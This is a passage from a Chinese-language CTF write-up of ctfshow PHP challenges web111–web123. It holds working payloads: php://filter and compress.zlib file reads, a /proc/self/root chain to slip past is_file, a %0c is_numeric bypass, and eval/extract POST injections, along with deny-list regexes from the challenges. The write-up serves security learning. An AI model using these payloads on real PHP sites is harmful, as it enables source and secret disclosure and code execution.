<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sum</span>();  <span class="comment">// 输出 30</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们定义了两个全局变量 <code>$x</code> 和 <code>$y</code>，然后在 <code>sum()</code> 函数中使用 <code>$GLOBALS</code> 数组访问这两个全局变量，实现了对它们的求和操作。</p>
<p>构造payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241113224940047.png" alt="image-20241113224940047"></p>
<p>注意 PHP 的函数具有词法作用域</p>
<p>在函数内部无法调用外部的变量，除非进行传参。这道题无非注意以下几点：</p>
<ol>
<li>我们最终要得到 $flag 的值，就需要 var_dump($$v1) 中的 $v1 为 flag，即 $v2 要为 flag，这样 $$v2 就为 $flag，&amp;$$v2 就为 $flag 对应的值</li>
<li>URL 传参时 $v2 不能直接传为 flag，否则 $flag 会因“函数内部无法调用外部变量”的限制而导致其返回 null</li>
<li>要想跨过词法作用域的限制，我们可以用 GLOBALS 常量数组，其中包含了 $flag 键值对，就可以将 $flag 的值赋给 $$v1</li>
</ol>
<h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>要求</strong>：file 不能是文件，且不能使用 http、https、data 伪协议，不能使用 input 参数，不能使用 rot13、base64、string 过滤器</p>
<h3 id="is-file-函数"><a href="#is-file-函数" class="headerlink" title="is_file()函数"></a>is_file()函数</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_file()<span class="string">` 函数用于判断给定的路径是否是一个文件，如果是则返回 `</span><span class="literal">true</span><span class="string">`，否则返回 `</span><span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>基础语法:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">is_file</span> ( <span class="keyword">string</span> <span class="variable">$filename</span> )</span><br></pre></td></tr></table></figure>

<p>参数 <code>$filename</code> 是要检查的文件路径。需要注意的是，这个函数只能用于检查文件，不能用于检查文件夹。</p>
<h4 id="要点-当is-file的参数为伪协议时，返回值为false"><a href="#要点-当is-file的参数为伪协议时，返回值为false" class="headerlink" title="要点:当is_file的参数为伪协议时，返回值为false"></a>要点:当is_file的参数为伪协议时，返回值为false</h4><p>解题:</p>
<h3 id="解法一-直接用包装器伪协议"><a href="#解法一-直接用包装器伪协议" class="headerlink" title="解法一:直接用包装器伪协议"></a>解法一:直接用包装器伪协议</h3><h4 id="filter包装器"><a href="#filter包装器" class="headerlink" title="filter包装器"></a>filter包装器</h4><p><code>filter</code> 包装器是 PHP 中用于在数据流中应用过滤器的一种特殊包装器。它允许你通过指定过滤器来对数据进行过滤、修改或转换。</p>
<p>使用 <code>filter</code> 包装器，你可以对输入和输出进行过滤操作，包括数据验证、数据清理、编码转换等。它提供了一种方便的方式来处理各种数据流，如文件、网络连接、字符串等。</p>
<p>基础用法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter:<span class="comment">//data</span></span><br></pre></td></tr></table></figure>

<p><code>filter</code> 是要应用的过滤器的名称，<code>data</code> 是要过滤的数据。</p>
<p>这里限制了很多伪协议，但是我们可以发现php:&#x2F;&#x2F;filter伪协议还是可以用的</p>
<p>payload:</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>
<h3 id="重-解法二-用过滤器进行转换"><a href="#重-解法二-用过滤器进行转换" class="headerlink" title="(重)解法二:用过滤器进行转换"></a>(重)解法二:用过滤器进行转换</h3><p>因为这题限制了字符，所以我们选择限制字符以外的过滤器即可</p>
<ul>
<li><h4 id="php-filter-read-convert-quoted-printable-encode-resource-flag-php"><a href="#php-filter-read-convert-quoted-printable-encode-resource-flag-php" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php"></a>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php</h4></li>
</ul>
<p><code>convert.quoted-printable-encode</code> 是过滤器，用于将文件内容转换为 quoted-printable 编码</p>
<ul>
<li><h4 id="compress-zlib-flag-php"><a href="#compress-zlib-flag-php" class="headerlink" title="compress.zlib:&#x2F;&#x2F;flag.php"></a>compress.zlib:&#x2F;&#x2F;flag.php</h4></li>
</ul>
<p><code>compress.zlib://flag.php</code> 是另一种 PHP 包装器（wrapper），用于读取经过 zlib 压缩的文件内容</p>
<ul>
<li><h4 id="php-filter-convert-iconv-UCS-2LE-UCS-2BE-resource-flag-php"><a href="#php-filter-convert-iconv-UCS-2LE-UCS-2BE-resource-flag-php" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php"></a>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php</h4></li>
</ul>
<p><code>convert.iconv.UCS-2LE.UCS-2BE</code> 是一个过滤器，用于将 <code>flag.php</code> 文件内容从 UCS-2LE 编码转换为 UCS-2BE 编码。</p>
<ul>
<li><h4 id="php-filter-read-convert-iconv-utf-8-utf-16le-resource-flag-php"><a href="#php-filter-read-convert-iconv-utf-8-utf-16le-resource-flag-php" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php"></a>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16le&#x2F;resource&#x3D;flag.php</h4></li>
</ul>
<p><code>convert.iconv.utf-8.utf-16le</code> 是一个 <code>php://filter</code> 包装器中的过滤器，用于将 UTF-8 编码的文本转换为 UTF-16LE 编码。</p>
<ul>
<li><h4 id="php-filter-read-convert-quoted-printable-encode-resource-flag-php-1"><a href="#php-filter-read-convert-quoted-printable-encode-resource-flag-php-1" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php"></a>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php</h4></li>
</ul>
<p><code>convert.quoted-printable-encode</code> 是一个内置的 PHP 过滤器，用于将数据转换为 Quoted-Printable 编码</p>
<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好吧包装器filter也被过滤啦，可是我们上道题学过一个不用包装器的读取flag的方法，直接用就行了</p>
<p>但是我们这里要学一个新姿势，利用require_once绕过不能重复包含文件的限制</p>
<h3 id="知识点-require-once-绕过不能重复包含文件的限制-目录溢出"><a href="#知识点-require-once-绕过不能重复包含文件的限制-目录溢出" class="headerlink" title="知识点:require_once 绕过不能重复包含文件的限制(目录溢出)"></a>知识点:require_once 绕过不能重复包含文件的限制(目录溢出)</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235?from=timeline">https://www.anquanke.com/post/id/213235?from=timeline</a></p>
<p>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls &#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容。多次重复后绕过is_file。大佬的解释是:超过20次软连接后就可以绕过is_file</p>
<p>这里使用的是PHP最新版的小Trick，require_once包含的软链接层数较多时once 的 hash 匹配会直接失效造成重复包含（目录溢出）<br><strong>payload2</strong>：目录溢出导致is_file认为这不是一个文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好啊好啊，这次把上一题的两个方法全部禁用了</p>
<p>但是细看可以发现我们的filter被放出来了，那就直接用上上题的方法做就行了，但是不能用过滤器convert，没关系我们可以不用过滤器直接用filter读取文件</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure>

<p>出现新函数了，先了解一下新函数</p>
<h3 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace()函数"></a>str_replace()函数</h3><p><code>str_replace()</code> 是 PHP 中的一个字符串替换函数，用于在一个字符串中将指定的子字符串替换为另一个子字符串</p>
<p>基本语法:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">str_replace</span>(<span class="variable">$search</span>, <span class="variable">$replace</span>, <span class="variable">$subject</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>$search</code>：要查找和替换的子字符串，可以是一个字符串或字符串数组。</li>
<li><code>$replace</code>：用于替换的字符串或字符串数组，可以与 <code>$search</code> 长度相同，也可以是一个字符串。</li>
<li><code>$subject</code>：要进行替换操作的字符串或字符串数组。</li>
</ul>
<h3 id="trim-函数"><a href="#trim-函数" class="headerlink" title="trim()函数"></a>trim()函数</h3><p><code>trim()</code> 函数是 PHP 中用于去除字符串首尾空白字符的函数</p>
<p>基础语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">trim</span>(<span class="variable">$str</span>, <span class="variable">$charlist</span>)</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><p><code>$str</code>：要处理的字符串。</p>
</li>
<li><p><code>$charlist</code>（可选）：指定要删除的字符列表。如果未指定该参数，trim() 将去除这些字符：</p>
<p>“ “ (ASCII 32 (0x20))，普通空格符。<br>“\t” (ASCII 9 (0x09))，制表符。<br>“\n” (ASCII 10 (0x0A))，换行符。<br>“\r” (ASCII 13 (0x0D))，回车符。<br>“\0” (ASCII 0 (0x00))，空字节符。（空字符）  %0c也相当于空字符<br>“\x0B” (ASCII 11 (0x0B))，垂直制表符</p>
</li>
</ul>
<p><code>trim()</code> 函数执行以下操作：</p>
<ul>
<li>删除 <code>$str</code> 字符串开头和结尾的空白字符或指定的字符列表。</li>
<li>返回处理后的字符串。</li>
</ul>
<p>返回来分析代码</p>
<p>第一层if语句让num进行一系列过滤后不能为36，第二层if语句又让num必须为36才能拿到flag，第一层过滤了八进制，十六进制和科学计数法，小数点和+号，可以说我能想到的能绕过验证的方法都被pass掉了，应该又是学习新姿势的题目了</p>
<p>直接看wp进行学习:</p>
<p>分析:</p>
<p>is_numeric($num)要求num识别为数字或者数字字符串，但num不能强等于“36“</p>
<p>trim($num)!&#x3D;&#x3D;’36’要求不能强等于”36“,然后filter之后要弱等于36</p>
<p>$num&#x3D;&#x3D;’36’但最后要求弱等于”36”</p>
<p>所以这道题的入口应该是在于如何绕过is_numeric()和trim()函数</p>
<p>我们可以知道，is_numeric()函数只允许数字或者数字字符串，但数字和数字字符串之间有空格也是可以的</p>
<p>做个测试:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;<span class="number">128</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>)===<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9</span></span><br></pre></td></tr></table></figure>

<p>通过遍历ascii码找到在数字前加上字符后能通过is_numeric()函数验证的字符</p>
<p>那我们再测试一下is_numeric()和trim()函数(或者参考trim去除的字符后看看剩下哪些字符是可以同时满足两个函数验证的)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">128</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$x</span>)!==<span class="string">&#x27;36&#x27;</span> &amp;&amp;<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出结果%0C %2B - . 0 1 2 3 4 5 6 7 8 9</span></span><br></pre></td></tr></table></figure>

<p>%0c是换页符\f</p>
<p>所以构造payload:</p>
<p>?num&#x3D;%0c36</p>
<h3 id="注-对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍"><a href="#注-对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍" class="headerlink" title="注:对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍"></a>注:对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍</h3><h1 id="突破函数禁用"><a href="#突破函数禁用" class="headerlink" title="突破函数禁用"></a>突破函数禁用</h1><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="关于-SERVER-‘argv’"><a href="#关于-SERVER-‘argv’" class="headerlink" title="关于$_SERVER[‘argv’]"></a>关于$_SERVER[‘argv’]</h4><p><code>$_SERVER</code> 是 PHP 中的一个超全局变量，用于获取服务器和执行环境的相关信息</p>
<p>假设你有一个名为 <code>script.php</code> 的 PHP 脚本，并且你在命令行中执行以下命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php script.php arg1 arg2 arg3</span><br></pre></td></tr></table></figure>

<p>那么在 <code>script.php</code> 中，你可以使用 <code>$a = $_SERVER[&#39;argv&#39;];</code> 来获取命令行参数的值：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>上述代码将输出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; script.php</span><br><span class="line">    [<span class="number">1</span>] =&gt; arg1</span><br><span class="line">    [<span class="number">2</span>] =&gt; arg2</span><br><span class="line">    [<span class="number">3</span>] =&gt; arg3</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>不过这个结果是在命令行下的结果，正常的网页模式下需要确保php.ini开启register_argc_argv配置项，设置register_argc_argv &#x3D; On(默认是Off)才会有效果</p>
<p>解题:</p>
<p>思考</p>
<ul>
<li>我们需要传入的参数有CTF_SHOW,CTF_SHOW.COM,不能传入fl0g，但题目要求fl0g的值强等于flag_give_me才能拿到flag</li>
<li>对$c参数进行了过滤，并限制了c的值不能大于18</li>
<li>题目中有危险函数eval，将c传入的值当成php代码执行</li>
</ul>
<h3 id="解法一-通过eval输出flag"><a href="#解法一-通过eval输出flag" class="headerlink" title="解法一:通过eval输出flag"></a>解法一:通过eval输出flag</h3><p>先说payload再解释:</p>
<p>1.POST:CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;extract($_POST)&amp;fl0g&#x3D;flag_give_me</p>
<p>2.POST:CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag</p>
<p>3.POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;var_dump($GLOBALS)   &#x2F;&#x2F;题目出不来，本地测试可以</p>
<p>前面对于CTF_SHOW的传参就不说了，只是单纯为了满足条件，和第二个参数CTF_SHOW.COM一样，但这里可以发现为什么我们传入的参数不是CTF_SHOW.COM而是CTF[SHOW.COM，这就涉及到PHP的命名规则了</p>
<h4 id="PHP命名规则"><a href="#PHP命名规则" class="headerlink" title="PHP命名规则"></a>PHP命名规则</h4><p>变量名的命名规则是</p>
<ul>
<li>变量以 $ 符号开头，其后是变量的名称。</li>
<li>变量名称必须以字母或下划线开头。</li>
<li>变量名称不能以数字开头。</li>
